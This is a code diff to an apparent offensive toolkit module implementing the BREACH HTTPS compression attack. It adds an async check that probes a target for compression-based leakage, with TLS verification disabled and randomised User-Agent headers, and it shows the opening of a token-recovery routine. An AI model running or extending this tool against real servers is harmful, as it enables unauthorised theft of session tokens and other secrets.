@@ -6,6 +6,8 @@ Exploits HTTP compression to extract secrets from response bodies.
 
 import requests
 import string
+import aiohttp
+import asyncio
 from typing import Optional
 
 from sslpwn.attacks.base import BaseAttack
@@ -20,7 +22,7 @@ class BreachAttack(BaseAttack):
         self.mask_length = mask_length
 
     def check_vulnerability(self) -> bool:
-        """Check if the server supports gzip/deflate and content-length changes."""
+        """Sync check. Used as fallback."""
         url = f"{self.target_url}/?{self.token_parameter}=a"
         headers = {"User-Agent": self.user_agents.random(), "Accept-Encoding": "gzip, deflate"}
         try:
@@ -37,13 +39,31 @@ class BreachAttack(BaseAttack):
         except Exception:
             return False
 
+    async def check_vulnerability_async(self) -> bool:
+        """Async check using aiohttp."""
+        url = f"{self.target_url}/?{self.token_parameter}=a"
+        headers = {"User-Agent": self.user_agents.random(), "Accept-Encoding": "gzip, deflate"}
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(url, headers=headers, ssl=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+                    if "Content-Length" in resp.headers:
+                        len_gzip = int(resp.headers["Content-Length"])
+                        headers_none = headers.copy()
+                        del headers_none["Accept-Encoding"]
+                        async with session.get(url, headers=headers_none, ssl=False, timeout=aiohttp.ClientTimeout(total=5)) as resp2:
+                            if "Content-Length" in resp2.headers:
+                                len_none = int(resp2.headers["Content-Length"])
+                                return len_gzip < len_none
+            return False
+        except Exception:
+            return False
+
     def exploit(self) -> bool:
-        """Full BREACH token recovery."""
+        """Full BREACH token recovery (sync)."""
         self.output.log("Starting BREACH attack", "INFO")
         mask = "." * self.mask_length
         chars = string.ascii_letters + string.digits + "_{}"
 
-        # baseline
         if self.adaptive:
             profile = self.adaptive.wait_and_prepare()
             headers = profile.as_headers()
